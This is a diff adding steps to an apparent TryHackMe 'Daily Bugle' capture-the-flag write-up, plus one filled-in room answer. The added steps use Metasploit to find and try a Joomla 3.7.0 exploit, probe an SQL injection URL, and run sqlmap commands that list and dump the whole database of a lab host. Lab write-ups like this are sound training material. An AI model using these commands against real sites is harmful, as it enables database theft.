@@ -62,6 +62,57 @@ Now we have selected our module let's see what options it requires by using show
 show options
 ```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT7.png?raw=true)<br />
+As you can see from the options available, the only option required is RHOSTS so let's set that and run the scanner!
+```shell
+SET RHOSTS 10.10.217.112
+exploit
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT8.png?raw=true)<br />
+Success! We have found the version! This is also one of the answers to our questions. Let's see if this version has any vulnerabilities.
+
+### Exploiting Joomla with Metasploit
+
+We are now going to look for exploits in Joomla 3.7, let's continue in the Metasploit console and execute the folowing<br />
+```shell
+back
+search joomla 3.7.0
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT9.png?raw=true)<br />
+We can see one exploit available, let's select the exploit and run "info" for more information to make sure it's compatible with our version of Joomla.<br />
+```shell
+use 0
+info
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT10.png?raw=true)<br />
+As we can see from the results this is the correct exploit for our Joomla version. Let's try to explot Joomla! First we'll need to set the required options for the module. Then hit exploit like we did for the scanner!<br />
+```shell
+set RHOSTS 10.10.217.112
+exploit
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT11.png?raw=true)<br />
+Uh-oh something went wrong, let's have a look at the "info" command again, let's check out the exploit-db link they provide.<br />
+```shell
+https://www.exploit-db.com/exploits/42033
+```
+Let's check if we get an error message when trying to load the URL that's vulnerable. 
+```shell
+http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT12.png?raw=true)<br />
+We get the error message which confirms it's vulnerable to SQL injection. Let's try using SQLmap instead they have the syntax for the command on the exploit-db page.<br />
+
+### Exploiting Joomla with SQLi using SQLMap
+
+We're going to open up a new terminal and try the below command.<br />
+```shell
+sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT13.png?raw=true)<br />
+Success! We were able to get the database names, now let's dump the whole database and check the findings! We will use a similar command except replace --dbs with --dump-all<br />
+```shell
+sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
+```
+
 
 
 
@@ -75,7 +126,7 @@ Question 1:<br />
 **Access the web server, who robbed the bank?** Spiderman<br />
 
 Question 2:<br />
-**What is the Joomla version?** <br />
+**What is the Joomla version?** 3.7.0<br />
 
 Question 3:<br />
 **What is Jonah's cracked password?** <br />
